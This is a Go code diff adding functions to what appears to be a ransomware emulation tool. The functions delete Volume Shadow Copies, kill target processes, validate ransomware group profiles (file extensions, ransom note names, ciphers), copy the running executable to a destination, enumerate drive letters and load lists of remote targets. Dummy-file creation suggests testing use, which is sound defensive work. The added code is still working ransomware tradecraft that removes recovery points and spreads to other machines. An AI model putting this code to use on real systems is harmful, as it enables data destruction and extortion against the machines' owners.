@@ -135,6 +135,68 @@ func replaceExtensionVariables(extension string) string {
 	return extension
 }
 
+func preEncryptionChecks(args map[string]any, isAdmin bool, isRemoteDevice bool, config Config, decryptEnabled bool) {
+
+	var err error
+	// Delete VSS Copies on target
+	if args["vss"].(bool) && isAdmin && !decryptEnabled {
+		printFormattedMessage("Attempting to terminate VSS Copies", INFO)
+		err = RemoveShadowCopies(isRemoteDevice)
+		if err != nil {
+			// Non-fatal so we will continue
+			printFormattedMessage(fmt.Sprintf("VSS Removal Error: %s", err.Error()), ERROR)
+		}
+	}
+
+	// Kill processes on target
+	// TODO Remove for release
+	if args["killprocs"].(bool) && 1 == 2 && isAdmin && !decryptEnabled {
+		printFormattedMessage("Attempting to terminate target processes", INFO)
+		err = KillTargetProcesses(config.ProcessKillNames, isRemoteDevice, "")
+		if err != nil {
+			// Non-fatal so we will continue
+			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
+		}
+	}
+}
+
+func setupRegex(config Config) error {
+	// Regex setup for file name-contains skips when doing encryption checks
+	var err error
+	regexString := ""
+	for i, v := range config.FileNameExclusions {
+		if i == 0 {
+			regexString = fmt.Sprintf(".*%s.*", strings.ToLower(v))
+		} else {
+			regexString = fmt.Sprintf("%s|.*%s.*", regexString, strings.ToLower(v))
+		}
+	}
+	fileNameSkipRegex, err = regexp.Compile(regexString)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func validateGroup(group RansomActor) error {
+	validExtensionMethods := []string{"mutate", "append"}
+	if !slices.Contains(validExtensionMethods, strings.ToLower(group.ExtensionMethod)) {
+		return fmt.Errorf("Invalid Group Extension Method: %s", group.ExtensionMethod)
+	}
+	if len(group.Notes) == 0 {
+		return fmt.Errorf("Invalid Group Note Names - 0 Length")
+	}
+	if len(group.Extensions) == 0 {
+		return fmt.Errorf("Invalid Group Extensions - 0 Length")
+	}
+
+	validNoteBehaviors := []string{"immediate", "delayed"}
+	if !slices.Contains(validNoteBehaviors, group.NoteBehavior) {
+		return fmt.Errorf("Invalid Group Note Behavior: %s", group.NoteBehavior)
+	}
+	return nil
+}
+
 // CreateFiles - Handles the creation of dummy data inside the target directory
 func CreateFiles(fileCount int, fileSize int, targetdir string) (error, []string) {
 	printFormattedMessage(fmt.Sprintf("Creating Dummy Data inside directory: %s", targetdir), INFO)
@@ -179,4 +241,97 @@ func CreateFiles(fileCount int, fileSize int, targetdir string) (error, []string
 	}
 	wg.Wait()
 	return nil, fileList
+}
+
+func copySelf(destination string) error {
+	sourcePath, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	sourceFile, err := os.Open(sourcePath)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+	destinationFile, err := os.Create(destination)
+	if err != nil {
+		return err
+	}
+	defer destinationFile.Close()
+	_, err = io.Copy(destinationFile, sourceFile)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func bitsToDrives(bitMap uint32) (drives []string) {
+	availableDrives := []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
+	for i := range availableDrives {
+		if bitMap&1 == 1 {
+			drives = append(drives, availableDrives[i])
+		}
+		bitMap >>= 1
+	}
+	return
+}
+
+func GetLogicalDriveLetters() (r []string) {
+	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
+		f, err := os.Open(string(drive) + ":\\")
+		if err == nil {
+			r = append(r, string(drive))
+			f.Close()
+		}
+	}
+	return
+}
+
+func ListGroupMetadata(config Config) {
+	printFormattedMessage(fmt.Sprintf(""), INFO)
+	printFormattedMessage("Ransomware Group Details", INFO)
+	for _, v := range config.Groups {
+		printFormattedMessage(fmt.Sprintf("############"), INFO)
+		printFormattedMessage(fmt.Sprintf("Group: %s", v.Group), INFO)
+		printFormattedMessage(fmt.Sprintf("Extensions: %s", strings.Join(v.Extensions, ", ")), INFO)
+		noteNames := make([]string, 0)
+		for _, j := range v.Notes {
+			noteNames = append(noteNames, j)
+		}
+		printFormattedMessage(fmt.Sprintf("Note Names: %s", strings.Join(noteNames, ", ")), INFO)
+		printFormattedMessage(fmt.Sprintf("Cipher: %s", v.Cipher), INFO)
+	}
+}
+
+func GetTargetList(args map[string]any) ([]string, error) {
+	if args["targets_file"].(string) != "" {
+		targets, err := readFileToSlice(args["targets_file"].(string))
+		if err != nil {
+			return nil, err
+		} else {
+			return targets, nil
+		}
+	} else if len(args["targets"].(StringSlice)) != 0 {
+		targets := make([]string, 0)
+		for _, v := range args["targets"].(StringSlice) {
+			targets = append(targets, strings.TrimSpace(v))
+		}
+		return targets, nil
+	} else {
+		return nil, fmt.Errorf("No targets specified in targets_file or targets parameters")
+	}
+}
+
+func readFileToSlice(file string) ([]string, error) {
+	var tmp []string
+	f, err := os.Open(file)
+	if err != nil {
+		return tmp, err
+	}
+	defer f.Close()
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		tmp = append(tmp, strings.TrimSpace(scanner.Text()))
+	}
+	return tmp, nil
 }
